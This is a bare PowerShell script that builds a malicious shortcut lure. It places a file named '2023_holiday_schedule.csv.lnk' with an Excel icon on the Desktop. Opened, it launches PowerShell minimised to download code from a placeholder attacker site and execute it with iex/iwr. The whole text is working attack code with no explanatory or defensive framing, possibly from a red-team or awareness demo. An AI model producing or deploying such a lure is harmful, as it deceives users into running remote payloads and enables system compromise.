$shell = New-Object -ComObject WScript.Shell
$Location="$([Environment]::GetFolderPath('Desktop'))" 
$shortcut = $shell.CreateShortcut("$Location\2023_holiday_schedule.csv.lnk")
$shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$shortcut.Arguments = "iex (iwr 'http://somehackersite')"
$shortcut.IconLocation="C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"
$shortcut.Hotkey = ""
$shortcut.WindowStyle = 7
$shortcut.Save()
